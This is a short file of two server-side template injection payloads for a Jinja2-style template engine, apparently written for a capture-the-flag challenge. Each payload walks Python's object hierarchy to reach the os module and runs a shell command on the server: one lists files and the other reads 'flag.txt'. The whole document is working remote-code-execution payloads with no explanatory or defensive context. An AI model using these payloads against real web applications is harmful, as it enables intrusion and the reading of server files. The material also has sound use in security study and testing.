# payload to make class and run script on server, runs ls
{{"".__class__.__mro__[1].__subclasses__()[186].__init__.__globals__["__builtins__"]["__import__"]("os").popen("ls *").read()}}

# same payload, getting file instead
{{"".__class__.__mro__[1].__subclasses__()[186].__init__.__globals__["__builtins__"]["__import__"]("os").popen("cat flag.txt").read()}}